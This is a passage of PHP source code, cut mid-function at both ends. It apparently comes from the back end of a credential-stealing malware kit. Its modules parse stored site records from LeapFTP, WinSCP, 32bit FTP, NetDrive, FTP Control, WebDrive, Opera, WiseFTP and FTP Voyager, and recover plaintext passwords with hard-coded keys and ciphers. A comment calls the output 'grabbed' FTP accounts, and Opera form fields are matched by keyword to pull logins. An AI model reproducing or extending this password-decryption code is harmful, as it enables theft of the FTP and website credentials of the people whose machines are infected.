		$encrypted_password = substr($encrypted_password, 0, -(8-ord($encrypted_password[strlen($encrypted_password)-1])));
		return ztrim($encrypted_password);
	}

	private function decrypt_old($encrypted_password)
	{
		if (!strlen($encrypted_password))
			return '';

		if ($encrypted_password[0] != chr(0x7f))
			return '';

		$encrypted_password = substr($encrypted_password, 1);
		if (strlen($encrypted_password) % 2 != 0)
			return '';

		$result = '';

		for ($i = 0; $i < strlen($encrypted_password); $i += 2)
		{
			$result .= chr(ord($encrypted_password[$i])-0x15);
		}

		return $result;
	}

	private function read_ftp_item($file_stream)
	{
		if (!$file_stream->state)
			return false;

		$file_stream->read_bytestring(); // sitename
		$port = $file_stream->read_word(); // port
		$host = $file_stream->read_bytestring(); // host
		$user = $file_stream->read_bytestring(); // user
		$pass = $this->decrypt($file_stream->read_bytestring()); // password
		$file_stream->read_bytestring(); // local path
		$dir = $file_stream->read_bytestring(); // remote directory
		$file_stream->read_bytestring(); // notes
		$file_stream->read_bytestring(); // retry count
		$file_stream->read_bytestring(); // retry delay
		$protocol = $file_stream->read_dword(); // protocol

		$file_stream->read_skip(16*4+4);

		$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == 3), $port, $dir), $user, $pass);

		$continue = true;
		while ($continue && $file_stream->state)
		{
			$block_id = $file_stream->read_byte();
			if (!$file_stream->state)
				break;
			switch ($block_id)
			{
				case 100:
				case 101:
				case 105:
					$file_stream->read_bytestring();
					break;
				case 106:
					$file_stream->read_bytestring();
					break;
				case 102:
					$file_stream->read_bytestring();
					$file_stream->read_skip(1);
					break;
				case 107:
					$file_stream->read_bytestring();
					$file_stream->read_bytestring();
					break;
				case 0xff:
					// final block
					$continue = false;
					break;
				default:
					$this->log->add("ERR_UNEXPECTED_LEAPFTP_DATABLOCK");
					return false;
			}
		}

		return $file_stream->state;
	}

	protected function process_dat_file($file_contents)
	{
		if (strlen($file_contents) <= 4)
			return true;

		$file_stream = new stream_leapftp($file_contents, $this->log);

		$file_header = $file_stream->read_dword();

		// check for master password protection
		if ($file_header == 0x54535f45)
			return true;

		// verify file header
		if ($file_header != 0x017a69)
		{
			$this->log->add("ERR_INVALID_LEAPFTP_DAT_VERSION");
			return false;
		}

		while (!$file_stream->eof() && $file_stream->state)
		{
			$is_folder = $file_stream->read_byte();
			if (!$file_stream->state)
				break;
			if ($is_folder == 0)
			{
				$file_stream->read_skip(2);
				$file_stream->read_bytestring(); // folder name
			} else if ($is_folder == 1)
			{
				$file_stream->read_skip(1);
				if (!$this->read_ftp_item($file_stream))
					break;
			} else
			{
				$this->log->add("ERR_UNEXPECTED_LEAPFTP_DATA");
				return false;
			}
		}

		return ($file_stream->state) && ($file_stream->eof());
	}

	protected function process_ini_file($file_contents)
	{
		if (strlen($file_contents) <= 4)
			return;

		$parsed_ini = parse_ini($file_contents);

		foreach ($parsed_ini as $section)
		{
			if (!is_array($section))
				continue;
			$host = assign($section["ip"]);
			$user = assign($section["user"]);
			$pass = $this->decrypt_old(assign($section["pass"]));
			$dir = assign($section["remotedir"]);
			$port = assign($section["port"]);
			$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_dat_file($stream->read_str());
				break;
			case 0x0001:
				$this->process_ini_file($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// WinSCP 4.3.2 (Build 1201)

class module_winscp extends module
{
 	private function decrypt($host, $user, $encrypted_password)
	{
		if (!strlen($encrypted_password))
			return '';

		$encrypted_password = hextostr($encrypted_password);

		if ($encrypted_password === false)
		{
			// word 'PASSWORD' can be stored instead of a hex-encoded string
			return '';
		}

		for ($i = 0; $i < strlen($encrypted_password); $i++)
			$encrypted_password[$i] = chr(ord($encrypted_password[$i]) ^ 92);

		$blen = ord($encrypted_password[2]);
		$bskip = ord($encrypted_password[3]);

		$encrypted_password = substr($encrypted_password, 4);
		$encrypted_password = substr($encrypted_password, $bskip);
		$plain_password = substr($encrypted_password, 0, $blen);

		return substr($plain_password, strlen($host) + strlen($user));
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
			case 0x0010:
				$host = urldecode($stream->read_str());
				$user = urldecode($stream->read_str());
				$pass = $this->decrypt($host, $user, $stream->read_str());
				$port = $stream->read_dword();
				$dir  = $stream->read_str();

				$proto = 0;

				if (($id & 0x10) > 0)
				{
					// 5: FTP
					// 2: clean SFTP
					// empty (0): SFTP with SCP callback (default)
					$proto = $stream->read_dword();
				}

				$this->add_ftp(append_port_dir(ftp_force_ssh($host, $proto != 5), $port, $dir), $user, $pass);

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// 32bit FTP 2.6.1

class module_32bitftp extends module
{
 	private function decrypt($encrypted_password)
	{
		if (!strlen($encrypted_password))
			return '';

		$decoded_password = hextostr($encrypted_password);
		if ($decoded_password === false)
		{
			$this->log->add('ERR_INVALID_HEX_STRING');
		}

		for ($i = 0; $i < strlen($decoded_password); $i++)
			$decoded_password[$i] = chr(ord($decoded_password[$i]) - $i);

		return $decoded_password;
	}

	protected function process_ini_file($file_contents)
	{
		if (!trim($file_contents))
			return;

		$parsed_ini = parse_ini($file_contents);
		foreach ($parsed_ini as $section)
		{
			if (!is_array($section))
				continue;
			$host = assign($section["hostaddress"]);
			$user = assign($section["hostusername"]);
			$pass = $this->decrypt(assign($section["hostpassword"]));
			$dir = assign($section["remotesitedirlast"]);
			$port = assign($section["hostport"]);

			$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_ini_file($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// NetDrive 1.2.0.4

class module_netdrive extends module
{
 	private function decrypt($encrypted_password)
	{
		if (!strlen($encrypted_password))
			return '';

		$encrypted_password = hextostr($encrypted_password);
		if ($encrypted_password === false)
		{
			$this->log->add('ERR_INVALID_HEX_STRING');
			return '';
		}

		$cipher_key = 'klfhuw%$#%fgjlvf'.chr(0);
		$iv = "\0\0\0\0\0\0\0\0";
		$plain_text = mcrypt_decrypt(MCRYPT_3DES, $cipher_key, $encrypted_password, MCRYPT_MODE_ECB, $iv);
		if (!strlen($plain_text))
		{
			$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
		}

		return trim($plain_text);
	}

	protected function read_xml_item($xml_array)
	{
		$host = assign($xml_array['Address']);
		$user = assign($xml_array['User']);
		$user = $this->decrypt($user);
		$pass = assign($xml_array['Pass']);
		$pass = $this->decrypt($pass);
		$port = assign($xml_array['Port']);
		$protocol = assign($xml_array['SSL']);

		$this->add_ftp(append_port(ftp_force_ssh($host, $protocol == '5'), $port), $user, $pass);

		foreach ($xml_array as $value)
		{
			if (is_array($value))
				$this->read_xml_item($value);
		}
	}

	protected function rec_scan_xml_array($xml_array)
	{
		foreach ($xml_array as $key=>$value)
		{
			if (is_array($value))
			{
				if (strval($key) == 'Site')
					$this->read_xml_item($value);
				$this->rec_scan_xml_array($value);
			}
		}
	}

	protected function process_xml($value)
	{
		if (strlen($value) == 0)
			return;

		$xml_parser = new XMLParser($value);
		$parsed_xml = $xml_parser->parse();
		if (!$xml_parser->isError || is_array($parsed_xml))
		{
			$this->rec_scan_xml_array($parsed_xml);
		} else
		{
			$this->log->add("ERR_XML_PARSE");
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_xml($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FTP Control 4.5.0.0

class module_ftpcontrol extends module
{
 	private function decrypt($encrypted_password)
	{
		if (strlen($encrypted_password) == 0)
			return '';

		$decoded_password = hextostr($encrypted_password);

		if ($decoded_password === false)
		{
			$this->log->add("ERR_CANNOT_DECRYPT_PASSWORD");
		}

		$key = 0x2396;
		for ($i = 0; $i < strlen($decoded_password); $i++)
		{
			$old = $decoded_password[$i];
			$decoded_password[$i] = chr(ord($decoded_password[$i]) ^ (($key >> 8) & 0xff));
			$key = hexdec(gmp_strval(gmp_and(gmp_add(gmp_mul(gmp_add("$key", strval(ord($old))), "0xCE6D"), "0x58BF"), "0xffffffff"), 16));
		}

		return $decoded_password;
	}

	protected function process_ini_file($file_contents)
	{
		if (strlen(trim($file_contents)) == 0)
			return;

		$parsed_ini = parse_ini($file_contents);
		foreach ($parsed_ini as $section)
		{
			if (!is_array($section))
				continue;
			$host = assign($section["host"]);
			$user = assign($section["username"]);
			$pass = $this->decrypt(assign($section["password"]));
			$dir = assign($section["defaultdirectory"]);
			$port = assign($section["port"]);

			$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_ini_file($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// WebDrive 9.16 (Build 2385) 64-bit tested

class module_webdrive extends module
{
 	private $CWebDriveKey = "\xDA\xF2\xE6\xE8\xD2\xC6\xBE\xE4\xD0\xF2\xE8\xD0\xDA\xE6";

	private function gen_check_key($salt)
	{
		return substr(sha1(substr($this->CWebDriveKey, 0, 14).substr($salt, 0, 8), true), 0, 8);
	}

	private function gen_key_iv($salt, &$key_out, &$iv_out)
	{
		$mash_key = $this->CWebDriveKey.substr($salt, 0, 8);
		$out_buf = '';

		$i = 0;
		while ($i < 24)
		{
			$out_buf .= sha1(chr($i >> 8).chr($i).$mash_key, true);
			$i += 20;
		}

		for ($k = 0; $k < 199; $k++)
		{
			$buf = $out_buf;
			$out_buf = '';
			$i = 0;
			while ($i < 24)
			{
				$out_buf .= sha1(chr($i >> 8).chr($i).$buf, true);
				$i += 20;
			}
		}

		$key_out = substr($out_buf, 0, 16);
		$iv_out = substr($out_buf, 16, 8);
	}

	private function decrypt($encrypted_password)
	{
		if (strlen($encrypted_password) < 3+16*2)
			return '';

		$encrypted_password = substr($encrypted_password, 1);

		// check password length
		$pass_len = (ord($encrypted_password[1]) << 8) | (ord($encrypted_password[0]));
		if ($pass_len != strlen($encrypted_password)-2)
		{
			$this->log->add("ERR_CANNOT_DECRYPT_PASSWORD");
			return '';
		}

		// cut password length
		$encrypted_password = substr($encrypted_password, 2);

		if (strlen($encrypted_password) % 8 != 0)
		{
			$this->log->add("ERR_CANNOT_DECRYPT_PASSWORD");
			return '';
		}

		// Decrypt crypto++ hex-encoded password
		$iv = "\0\0\0\0\0\0\0\0";
		$hex_encrypted_pass = mcrypt_decrypt(MCRYPT_DES, substr($this->CWebDriveKey, 0, 8), $encrypted_password, MCRYPT_MODE_ECB, $iv);

		if (!strlen($hex_encrypted_pass))
		{
			$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
		}

		$decoded_pass = hextostr($hex_encrypted_pass);

		if (strlen($decoded_pass) <= 16 || strlen($decoded_pass) % 8 != 0)
		{
			$this->log->add('ERR_INVALID_HEX_STRING');
			return '';
		}

		// Generate decryption check values
		$decryption_check_value = $this->gen_check_key($decoded_pass);

		// Generate key and iv values
		$this->gen_key_iv($decoded_pass, $key, $iv);

		$decoded_pass = substr($decoded_pass, 8);

	    // Complete the key
	    $key_add = 24-strlen($key);
	    $key .= substr($key, 0, $key_add);

		// Decrypt password
		$plain_text = mcrypt_decrypt(MCRYPT_3DES, $key, $decoded_pass, MCRYPT_MODE_CBC, $iv);

		if (!strlen($plain_text))
		{
			$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
		}

		$chk_decrypted_text = substr($plain_text, 0, 8);
		$plain_text = substr($plain_text, 8);

		if ($chk_decrypted_text == $decryption_check_value)
		{
			if (strlen($plain_text))
			{
				$plain_text = substr($plain_text, 0, strlen($plain_text)-ord($plain_text[strlen($plain_text)-1]));
				return $plain_text;
			}
		}
		else
		{
			$this->log->add("ERR_CANNOT_DECRYPT_PASSWORD");
		}

		return '';
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
			case 0x0010:
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass = $this->decrypt($stream->read_str());
				$port = $stream->read_str();
				$dir  = $stream->read_str();

				if (($id & 0x10) > 0)
					$protocol = $stream->read_str();
				else
					$protocol = '';

				$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == '4'), $port, $dir), $user, $pass);

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Opera 6.x - 11.x

class module_opera extends module_chrome_base
{
	private function strpos_array($array, $value_name)
	{
		foreach ($array as $substr)
		{
			if (stripos($substr[0], $value_name) !== false)
			{
				return true;
			}
		}
		return false;
	}

	private function strpos_array_once($array, $value_name, $stop_words, &$out_pair)
	{
		foreach ($array as $substr)
		{
			if (stripos($substr[0], $value_name) !== false && !$this->strpos_array($stop_words, $substr[0]) && ($substr[2] == false) && strlen($substr[1]))
			{
				$substr[2] = true;
				$out_pair = $substr;
				return true;
			}
		}
		return false;
	}

	private function strpos_array_any_once($array, $stop_words, &$out_pair)
	{
		foreach ($array as $substr)
		{
			if (!$this->strpos_array($stop_words, $substr[0]) && ($substr[2] == false) && strlen($substr[1]))
			{
				$substr[2] = true;
				$out_pair = $substr;
				return true;
			}
		}
		return false;
	}

	private function read_site_item($stream)
	{
		$url = $stream->read_str();
		if (strlen($url) && $url[0] == '*')
		{
			$url = substr($url, 1);
		}

		$login_names = array('username', 'user_name', 'user-name', 'uname', 'login-name', 'login_name',
							 'email', 'e-mail', 'mail', 'account',
							 'login', 'ogin', 'user', 'u_id', 'uid','usr',
							 'nickname', 'nick_name', 'name', 'nick', 'acc', 'ident', 'id');
		$password_names = array('password', 'pass', 'pword', 'passwrd', 'pwrd', 'pwd', 'word', 'key');
		$stop_words = array('sav', 'stor', 'cook', 'remem', 'auto', 'action', 'pers');


		$data_pairs = array();
		do
		{
			$input_name = $stream->read_str();
			$input_value = $stream->read_str();
			$input_value2 = $stream->read_str();

			if ($stream->state && strlen($input_name) && (strlen($input_value) || strlen($input_value2)))
			{
				if (!strlen($input_value))
					$input_value = $input_value2;
				array_push($data_pairs, array($input_name, $input_value, false));
			}
		} while ($stream->state && strlen($input_name) && (strlen($input_value) || strlen($input_value2)));

		if (count($data_pairs) < 2)
			return;

		$found_login = false;
		$found_pass = false;
		$login_value = '';
		$pass_value = '';

		foreach ($login_names as $login_name)
		{
			// find login value
			$out_pair = array();
			if ($this->strpos_array_once($data_pairs, $login_name, $stop_words, $out_pair))
			{
				$login_value = $out_pair[1];
				$found_login = true;
				break;
			}
		}

		foreach ($password_names as $password_name)
		{
			// find pass value
			$out_pair = array();
			if ($this->strpos_array_once($data_pairs, $password_name, $stop_words, $out_pair))
			{
				$pass_value = $out_pair[1];
				$found_pass = true;
				break;
			}
		}

		if (!$found_login && $found_pass)
		{
			// login value not found, but password found
			// retrieve first available value as login
			if ($this->strpos_array_any_once($data_pairs, $stop_words, $out_pair))
			{
				$login_value = $out_pair[1];
				$found_login = true;
			}
		}

		if ($found_login && !$found_pass)
		{
			// password value not found, but login found
			// retrieve first available value as password
			if ($this->strpos_array_any_once($data_pairs, $stop_words, $out_pair))
			{
				$pass_value = $out_pair[1];
				$found_pass = true;
			}
		}

		if (!$found_login && !$found_pass && (count($data_pairs) >= 2))
		{
			$found_login = true;
			$found_pass = true;
			$login_value = $data_pairs[0][1];
			$pass_value = $data_pairs[1][1];
		}

		if ($found_login && $found_pass)
		{
			$this->add_http($url, $login_value, $pass_value);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				// site & ftp items
				$url = $stream->read_str();
				if (strlen($url) && $url[0] == '*')
					$url = substr($url, 1);
				$user = $stream->read_str();
				$pass = $stream->read_str();

				if (str_begins($url, 'ftp://'))
					$this->add_ftp($url, $user, $pass);
				elseif (str_begins($url, 'http://') || str_begins($url, 'https://'))
					$this->add_http($url, $user, $pass);
				break;
			case 0x0001:
				// wand forms
				$this->read_site_item($stream);
				break;
			case 0x0002:
				// chrome data
				$this->process_chrome_item($stream);
				break;
			case 0x1000:
				// erroneus wands
				$stream->read_str(); // wand file binary data
				$this->log->add("ERR_OPERA_WAND");
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// WiseFTP 1.x-7.x

class stream_wise extends stream
{
	function read_wise_str()
	{
		if (!$this->state)
			return false;
		return $this->read_strlen($this->read_byte());
	}

	function read_wise_uni_str()
	{
		if (!$this->state)
			return false;
		return $this->read_strlen($this->read_dword()*2);
	}

	function read_wise_item(&$name)
	{
		if (!$this->state)
			return '';
		$name = $this->read_wise_str();
		$item_type = $this->read_byte();
		if (!$this->state)
			return '';
		if (!strlen($name))
			return '';
		switch ($item_type)
		{
			case 2:
			case 14:
				return $this->read_byte();
				break;
			case 3:
				return $this->read_word();
				break;
			case 4:
				return $this->read_dword();
				break;
			case 5:
				$this->read_skip(10);
				break;
			case 6:
			case 7:
				return $this->read_wise_str();
				break;
			case 8:
				return true;
				break;
			case 9:
				return false;
				break;
			case 18:
				return unicode_to_utf8($this->read_wise_uni_str());
				break;
			case 19:
				return $this->read_dword();
				break;
			case 20:
				return $this->read_str();
				break;
			default:
				$this->push_error('ERR_UNK_WISEFTP_ITEM_TYPE: '.$item_type);
		}

		return '';
	}
}

class module_wiseftp extends module
{
	private function decrypt($encrypted_password)
	{
		$decoded_password = base64_decode($encrypted_password, true);
		if (!strlen($decoded_password))
			return '';

		if (strlen($decoded_password) % 16 != 0)
		{
			$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
			return '';
		}

		$iv = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
		$cipher_key = "\x9A\xB1\x13\xEC\xFB\x2F\x74\xAE\x5A\xAE\x46\x9F\x52\x1C\xE4\xEC";
		$decrypted_data = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $cipher_key, $decoded_password, MCRYPT_MODE_CBC, $iv);
		if (!strlen($decrypted_data))
		{
			$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
		}

		$decrypted_data = substr($decrypted_data, 16);

		if (strlen($decrypted_data))
		{
			// cut unused chars in last block
			$decrypted_data = substr($decrypted_data, 0, -(16-ord($decrypted_data[strlen($decrypted_data)-1])));
		}

		return trim($decrypted_data);
	}

	private function process_bin_file($file_data)
	{
		if (!strlen($file_data))
			return;

		$stream = new stream_wise($file_data, $this->log);

		$file_id = $stream->read_strlen(4);

		if ($file_id != 'TPF0')
		{
			$this->log->add("ERR_INVALID_WISEFTP_BIN_FILE");
			return;
		}

		$stream->read_wise_str(); // TServers
		$stream->read_wise_str(); // Servers1
		$stream->read_wise_str(); // FTPServer
		$stream->read_skip(2); // Unknown

		$host = '';
		$user = '';
		$pass = '';
		$port = '';
		$dir = '';
		$protocol = '';

		while (!$stream->eof() && $stream->state)
		{
			$item_name = '';
			$item_value = $stream->read_wise_item($item_name);

			switch ($item_name)
			{
				case 'ServerType':
					$protocol = $item_value;
					break;
				case 'Hostname':
					$host = Utf8ToWin($item_value);
					break;
				case 'Username':
					$user = Utf8ToWin($item_value);
					break;
				case 'Password':
					$pass = $item_value;
					if ($pass == 'your.name@your.server.com')
						$pass = '';
					break;
				case 'Port':
					$port = Utf8ToWin($item_value);
					break;
				case 'HostDirName':
					$dir = Utf8ToWin($item_value);
					break;
			}

			if (($item_name == '' || $item_name == 'ProfileName') && $stream->state)
			{
				if ($user != 'anonymous' && $pass != 'your.name@your.server.com')
				{
					$pass = Utf8ToWin($this->decrypt($pass));
					$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == '1'), $port, $dir), $user, $pass);
				}

				$host = '';
				$user = '';
				$pass = '';
				$port = '';
				$dir = '';
				$protocol = '';
			}
		}
	}

	private function process_ini_file($file_data)
	{
		if (!strlen($file_data))
			return;

		$parsed_ini = parse_ini($file_data);

		if (!count($parsed_ini))
			return;

		$count = assign($parsed_ini['FTPServers'][strtolower('Servers1_FTPServers.Count')]);
		if ($count > 0)
		{
			for ($i = 0; $i < min($count, 1000); $i++)
			{
				$host = assign($parsed_ini['FTPServers.Servers1_FTPServers'][strtolower("Item".$i."_HostName")]);
				$user = assign($parsed_ini['FTPServers.Servers1_FTPServers'][strtolower("Item".$i."_UserName")]);
				$pass = $this->decrypt(assign($parsed_ini['FTPServers.Servers1_FTPServers'][strtolower("Item".$i."_PassWord")]));
				$port = assign($parsed_ini['FTPServers.Servers1_FTPServers'][strtolower("Item".$i."_Port")]);
				$dir = assign($parsed_ini['FTPServers.Servers1_FTPServers'][strtolower("Item".$i."_HostDirName")]);
				$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
			}
		}

		$count = assign($parsed_ini['Main'][strtolower('FTPFavorites1_Items.Count')]);
		if ($count > 0)
		{
			for ($i = 0; $i < min($count, 1000); $i++)
			{
				$host = assign($parsed_ini['Main.FTPFavorites1_Items'][strtolower("Item".$i."_HostName")]);
				$user = assign($parsed_ini['Main.FTPFavorites1_Items'][strtolower("Item".$i."_UserName")]);
				$pass = $this->decrypt(assign($parsed_ini['Main.FTPFavorites1_Items'][strtolower("Item".$i."_PassWord")]));
				$port = assign($parsed_ini['Main.FTPFavorites1_Items'][strtolower("Item".$i."_Port")]);
				$dir = assign($parsed_ini['Main.FTPFavorites1_Items'][strtolower("Item".$i."_HostDirName")]);
				$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
			}
		}

		if (isset($parsed_ini['Main\TfrmFTPWalkerMain.mmQuickConnect']) && is_array($parsed_ini['Main\TfrmFTPWalkerMain.mmQuickConnect']))
		{
			foreach ($parsed_ini['Main\TfrmFTPWalkerMain.mmQuickConnect'] as $ftp_line)
			{
				$this->add_ftp($ftp_line);
			}
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				// Site manager (bin files)
				$this->process_bin_file($stream->read_str());
				break;
			case 0x0001:
				// Quick connections (registry)
				$mru_list = $stream->read_str();

				$ftp_array = explode(',', $mru_list);
				foreach ($ftp_array as $ftp_value)
					$this->add_ftp($ftp_value);
				break;
			case 0x0002:
				// Ini files
				$this->process_ini_file($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FTP Voyager 11.x-16.x

class stream_voyager extends stream
{
	function read_bytestring()
	{
		if (!$this->state)
			return false;
		$len = $this->read_byte();
		if ($len == 0xff)
			return $this->read_strlen($this->read_word());
		else
			return $this->read_strlen($len);
	}
}

class module_ftpvoyager extends module
{
    function tea_decrypt(&$v0, &$v1, $key)
    {
    	$sum = "0xC6EF3720";
    	$delta = "0x9e3779b9";

    	for ($i = 0; $i < 32; $i++)
    	{
    		$v1 = hexdec(gmp_strval(gmp_and(gmp_sub("$v1", (
    			gmp_xor(gmp_add(gmp_shiftl("$v0", 4), $key[2]),
    			gmp_xor(gmp_add("$v0", "$sum"),
    			gmp_add(gmp_shiftr('0x'.dechex($v0), 5), $key[3]))
    			)
    			)),
    			'0xffffffff'), 16));

    		$v0 = hexdec(gmp_strval(gmp_and(gmp_sub("$v0", (
    			gmp_xor(gmp_add(gmp_shiftl("$v1", 4), $key[0]),
    			gmp_xor(gmp_add("$v1", "$sum"),
    			gmp_add(gmp_shiftr('0x'.dechex($v1), 5), $key[1]))
    			)
    			)),
    			'0xffffffff'), 16));

    		$sum = hexdec(gmp_strval(gmp_and(gmp_sub("$sum", "$delta"), '0xffffffff'), 16));
    	}
    }

    function str_fix($value)
    {
    	return $value[3].$value[2].$value[1].$value[0];
    }

	private function decrypt($encrypted_password)
	{
        if (!strlen($encrypted_password))
    		return '';

    	if (strlen($encrypted_password) % 8 != 0)
    	{
    		$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
    		return '';
    	}

    	$key = "VictoriaPeterson";

    	$key_array = array();
    	$key_array[] = data_int32(substr($key, 0, 4));
    	$key_array[] = data_int32(substr($key, 4, 4));
    	$key_array[] = data_int32(substr($key, 8, 4));
    	$key_array[] = data_int32(substr($key, 12, 4));

    	$result = '';

    	$plain_text = '';

    	while (strlen($encrypted_password) > 8)
    	{
    		$v0 = data_int32(substr($encrypted_password, 0, 4));
    		$v1 = data_int32(substr($encrypted_password, 4, 4));

    		$this->tea_decrypt($v0, $v1, $key_array);

    		$v0 = $this->str_fix(hextostr(str_pad(dechex($v0), 8, "0", STR_PAD_LEFT))); // bswap32
    		$v1 = $this->str_fix(hextostr(str_pad(dechex($v1), 8, "0", STR_PAD_LEFT))); // bswap32

    		$result .= $v0.$v1;
    		$encrypted_password = substr($encrypted_password, 8);

    		$plain_text .= $v0[0];
    	}

    	return ztrim($plain_text);
	}

   	var $enable_advanced_processing_mode = false;

    private function read_ftp_item($stream, $log, $processing_mode = 0)
    {
        $record_ver = $stream->read_dword();

        if (!$stream->state)
            return false;

        if ($record_ver != 72 && $record_ver != 73 && $record_ver != 74 && $record_ver != 75 && $record_ver != 67 && $record_ver != 54 && $record_ver != 61 && $record_ver != 62 && $record_ver != 70 && $record_ver != 69)
        {
            $log->add("ERR_UNK_FTPVOYAGER_VER: $record_ver");
            return false;
        }

        if ($record_ver == 73)
		{
			$this->enable_advanced_processing_mode = true;
		}

        $stream->read_bytestring();        		// item name
        $stream->read_bytestring();             // comment

        $host = $stream->read_bytestring();     // host
        $dir = $stream->read_bytestring();      // remote dir
        $user = $stream->read_bytestring();     // user
        $pass =  $this->decrypt($stream->read_str()); // encrypted password

        $stream->read_skip(16);
        $stream->read_bytestring();             // another stored dir
        $stream->read_skip(8);

        $port = $stream->read_dword();

        $stream->read_skip(28);
        $stream->read_dword();                  // AccessibleFromPanel
        $stream->read_skip(4);
        $stream->read_bytestring();             // IncFilter
        $stream->read_bytestring();             // ExcFilter
        $stream->read_bytestring();             // ShortCut

        $stream->read_dword();                  // ShortCutMode
        $stream->read_dword();                  // AutoLoadingType

        $stream->read_skip(25);

        $stream->read_bytestring();             // LocalDir
        $stream->read_bytestring();             // Account
        $stream->read_skip(2);
		$stream->read_bytestring();             // UploadDir (seen in 54 versions only)
		$stream->read_skip(1);
        $stream->read_dword();                  // UseFreeInterpretType
        $stream->read_dword();                  // RequireID
        $stream->read_dword();                  // RequirePass
        $stream->read_dword();                  // ResumeSupport
        $stream->read_dword();                  // FEATSupport
        $stream->read_skip(8);

        if ($record_ver > 54)
        {
            $stream->read_skip(4);
        }
        $stream->read_bytestring();             // Command

        if ($record_ver > 54)
        {
            $stream->read_dword();              // TimeZone
            $stream->read_skip(14);
            if ($record_ver > 69)
                $stream->read_skip(4);
        }

        $command_count = $stream->read_word();
        if ($command_count > 0)
        {
            $command_ver = $stream->read_word();
            if ($command_ver == 0xffff)
            {
                // no record type information, read it
                $stream->read_skip(2);
                $stream->read_skip($stream->read_word());   // CommandClass
            }

            for ($i = 0; $i < $command_count; $i++)
            {
                if (!$stream->state)
                    break;
                if ($i > 0)
                    $stream->read_skip(2);
                $stream->read_skip(4);
                $stream->read_bytestring();     // Command_Name
                $stream->read_bytestring();     // Command_Value
                $stream->read_skip(12);         // Command flags
            }
        }

        $stream->read_dword();                  // UnkFlag1
        $stream->read_dword();                  // UnkFlag2
        $stream->read_dword();                  // UnkFlag3
        $stream->read_dword();                  // DownloadRetryCount
        $stream->read_dword();                  // UploadRetryCount

		$stream->read_skip(4);
        $protocol = $stream->read_dword(); 		// Protocol
        $stream->read_skip(16);

        // Write grabbed FTP
